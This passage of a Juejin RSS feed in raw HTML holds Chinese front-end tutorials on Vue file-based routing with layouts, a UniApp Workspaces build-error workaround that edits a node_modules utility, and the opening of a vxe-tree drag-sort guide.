pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>unplugin-vue-router</code> 会根据你的文件结构自动生成路由配置。虽然路由是自动生成的，但你仍然可以通过 <strong>路由元信息（meta）</strong> 来对组件做一些特殊处理。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">&lt;route</span> <span class="hljs-string">lang="yaml"&gt;</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">login</span>
    <span class="hljs-attr">meta:</span>
      <span class="hljs-attr">whiteList:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">title:</span> <span class="hljs-string">登录跳转</span>
      <span class="hljs-attr">constant:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">layout:</span> <span class="hljs-string">index</span>
<span class="hljs-string">&lt;/route&gt;</span>

</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">安装
pnpm i unplugin-vue-router -D

配置<span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-vue"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"unplugin-vue-router/vite"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title class_">VueRouter</span>({ <span class="hljs-attr">routesFolder</span>: <span class="hljs-string">"src/views"</span> }),
    <span class="hljs-title function_">vue</span>(),
  ]
});

使用
<span class="hljs-keyword">import</span> { routes } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router/auto/routes"</span> <span class="hljs-comment">// 引入文件路由表</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router"</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">routes</span>: routes, <span class="hljs-comment">// 注册文件路由表</span>
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
})

</code></pre>
<p>运行项目打印routes就会看到生成好的路由</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/919d5d0ed6f247039b293af31054c6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTEND:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765947876&amp;x-signature=5BOFV%2BdM4TIqBSOOSBfEtxDNh8k%3D" alt="image.png" loading="lazy"/></p>
<p>一般搭配<code>vite-plugin-vue-meta-layouts</code>使用</p>
<pre><code class="hljs language-javascript" lang="javascript">安装
pnpm i vite-plugin-vue-meta-layouts -D

配置<span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-vue"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"unplugin-vue-router/vite"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MetaLayouts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"vite-plugin-vue-meta-layouts"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title class_">VueRouter</span>({ <span class="hljs-attr">routesFolder</span>: <span class="hljs-string">"src/views"</span> }),
    <span class="hljs-title class_">Layouts</span>({
      <span class="hljs-attr">target</span>: <span class="hljs-string">"src/layouts"</span>, <span class="hljs-comment">// 布局目录，默认 src/layouts</span>
      <span class="hljs-attr">defaultLayout</span>: <span class="hljs-string">"index"</span>, <span class="hljs-comment">// 默认布局，默认为 default</span>
      <span class="hljs-attr">skipTopLevelRouteLayout</span>: <span class="hljs-literal">true</span>, 
    }),
    <span class="hljs-title function_">vue</span>(),
  ]
});

使用
<span class="hljs-keyword">import</span> { routes } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router/auto/routes"</span> <span class="hljs-comment">// 引入文件路由表</span>
<span class="hljs-keyword">import</span> { setupLayouts } <span class="hljs-keyword">from</span> <span class="hljs-string">"virtual:meta-layouts"</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router"</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">routes</span>: <span class="hljs-title function_">setupLayouts</span>(routes), <span class="hljs-comment">// 注册文件路由表</span>
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
})

如果你是 <span class="hljs-string">`ts`</span> 项目，还可以在 <span class="hljs-string">`tsconfig.json`</span> 中配置以下声明
{
  <span class="hljs-string">"compilerOptions"</span>: {
    <span class="hljs-string">"types"</span>: [<span class="hljs-string">"vite-plugin-vue-meta-layouts/client"</span>]
  }
}
</code></pre>
<p>在layouts文件夹创建不同的的布局文件</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66e8b1a345414bf7ae74ebd51aa11b2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTEND:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765947876&amp;x-signature=pUuyVOKb29XZ%2ByQqlm6Zjy5YkGw%3D" alt="image.png" loading="lazy"/></p>
<p>在页面组件中通过路由元信息配置layout的值来让页面使用哪种布局，一般在<code>vite.config.ts</code>配置默认使用的布局</p>
<pre><code class="hljs language-ini" lang="ini">&lt;route <span class="hljs-attr">lang</span>=<span class="hljs-string">"yaml"</span>&gt;
    meta:
      layout: empty 
&lt;/route&gt;
</code></pre>
<p>然后可以通过createGetRoutes查看生成的路由</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createGetRoutes } <span class="hljs-keyword">from</span> <span class="hljs-string">"virtual:meta-layouts"</span>

<span class="hljs-keyword">const</span> getRoutes = <span class="hljs-title function_">createGetRoutes</span>(router)

<span class="hljs-comment">// 获取路由表但是不包含布局路由</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getRoutes</span>())
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc1e67c0a7614781b6361f085f0e93b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTEND:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765947876&amp;x-signature=LsCAU%2F7uB8xLhxR3NVbDYkytVsU%3D" alt="image.png" loading="lazy"/></p>
<p>文件路由使用路由query
传参跳转页面需要为 router-view 添加唯一 key
不然就会出现<code>多次跳转同一页面，如果只是参数不同，页面不会重新执行生命周期方法</code></p>
<pre><code class="hljs language-ini" lang="ini">&lt;router-view <span class="hljs-attr">v-slot</span>=<span class="hljs-string">"{ Component, route }"</span>&gt;
   &lt;keep-alive :<span class="hljs-attr">include</span>=<span class="hljs-string">"cachedComponents"</span>&gt;
      &lt;component :<span class="hljs-attr">is</span>=<span class="hljs-string">"Component"</span> :key=<span class="hljs-string">"route.fullPath"</span> /&gt;
   &lt;/keep-alive&gt;
&lt;/router-view&gt;
</code></pre>
<p>当然，如果是使用动态路由就不会有这个问题</p>
<ul>
<li><code>src/views/users/[id].vue</code> → <code>/users/:id</code></li>
<li><code>src/views/posts/[...slug].vue</code> → <code>/posts/:slug(.*)*</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp Workspaces 编译报错（`Invalid pattern ...`）解决办法]]></title>    <link>https://juejin.cn/post/7581844141668483112</link>    <guid>https://juejin.cn/post/7581844141668483112</guid>    <pubDate>2025-12-10T05:36:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581844141668483112" data-draft-id="7581844141668384808" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp Workspaces 编译报错（`Invalid pattern ...`）解决办法"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T05:36:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp Workspaces 编译报错（`Invalid pattern ...`）解决办法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:36:47.000Z" title="Wed Dec 10 2025 05:36:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">问题</h2>
<p>在 Workspaces 组织 UniApp 项目时，编译为 mp-weixin 时出现报错：<code>Invalid pattern "../../....../xxx.js" for "output.chunkFileNames", patterns can be neither absolute nor relative paths. If you want your files to be stored in a subdirectory, write its name without a leading slash like this: subdirectory/pattern."</code>。</p>
<h2 data-id="heading-1">解决办法</h2>
<p>UniApp 编译工具没有正确处理 Workspaces 引入依赖时带有的相对路径 <code>../</code>。可以直接修改utils内的对应函数，将相对路径替换成空。</p>
<p>文件位于：</p>
<pre><code class="hljs language-bash" lang="bash">node_modules/@dcloudio/uni-cli-shared/dist/utils.js
</code></pre>
<p>找到 <strong><code>normalizeNodeModules</code></strong> 函数，修改：</p>
<p><strong>【修改前】</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">normalizeNodeModules</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-comment">// ... 原有代码</span>
  <span class="hljs-keyword">return</span> str;
}
</code></pre>
<p><strong>【修改后】</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">normalizeNodeModules</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-comment">// ... 原有代码</span>

  <span class="hljs-comment">// 匹配删除路径中的所有相对路径标识符 '../'</span>
  str = str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.\.\//g</span>, <span class="hljs-string">''</span>)

  <span class="hljs-keyword">return</span> str;
}
</code></pre>
<p>重启编译即可解决。</p>
<hr/>
<blockquote>
<p><strong>注意：</strong> 这是一个临时补丁。如果运行 <code>npm install</code> 等命令，该文件会被覆盖，需要重新修改。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vxe-tree 树组件拖拽排序功能的使用教程]]></title>    <link>https://juejin.cn/post/7581807793133781038</link>    <guid>https://juejin.cn/post/7581807793133781038</guid>    <pubDate>2025-12-10T05:39:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581807793133781038" data-draft-id="7581772744376352814" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vxe-tree 树组件拖拽排序功能的使用教程"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-10T05:39:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户84179481456"/> <meta itemprop="url" content="https://juejin.cn/user/3921272428567529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vxe-tree 树组件拖拽排序功能的使用教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3921272428567529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户84179481456
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:39:50.000Z" title="Wed Dec 10 2025 05:39:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>vxe-tree 树组件拖拽排序功能的使用教程，通过 drag 启用行拖拽排序功能，支持同层级、跨层级、拖拽到子级非常强大的拖拽功能等</p>
<p>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fvxeui.com" target="_blank" title="https://vxeui.com" ref="nofollow noopener noreferrer">vxeui.com</a>
github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fx-extends%2Fvxe-pc-ui" target="_blank" title="https://github.com/x-extends/vxe-pc-ui" ref="nofollow noopener noreferrer">github.com/x-extends/v…</a>
gitee：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fx-extends%2Fvxe-pc-ui" target="_blank" title="https://gitee.com/x-extends/vxe-pc-ui" ref="nofollow noopener noreferrer">gitee.com/x-extends/v…</a></p>
<h2 data-id="heading-0">同层级拖拽</h2>
<p>通过 drag-config.isPeerDrag 启用同层级拖拽</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/939fa9223b1d4946abd3437e1e2acf02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODQxNzk0ODE0NTY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765949989&amp;x-signature=q1vCFSdLjughWASXHiRuwmTPQhY%3D" alt="image" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-tree</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"treeOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-tree</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> treeOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">transform</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">drag</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">dragConfig</span>: {
    <span class="hljs-attr">isPeerDrag</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">data</span>: [
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'2'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'3'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-literal">null</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'31'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'32'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'321'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'32'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-2-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'322'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'32'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'33'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'3'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-1'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'331'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
    { <span class="hljs-attr">title</span>: <span class="hljs-string">'节点3-3-2'</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">'332'</span>, <span class="hljs-attr">parentId</span>: <span class="hljs-string">'33'</span> },
